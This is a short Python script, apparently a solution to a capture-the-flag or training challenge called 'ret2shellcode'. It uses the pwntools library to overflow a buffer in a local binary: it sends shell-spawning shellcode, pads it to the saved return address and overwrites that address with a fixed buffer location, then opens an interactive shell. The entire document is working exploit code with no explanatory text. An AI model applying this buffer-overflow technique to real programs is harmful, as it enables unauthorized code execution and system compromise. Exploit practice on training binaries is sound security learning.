from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x804a080

sh.sendline(shellcode + b'A' * ((0x6c+4) - len(shellcode)) + p32(buf2_addr))
sh.interactive()
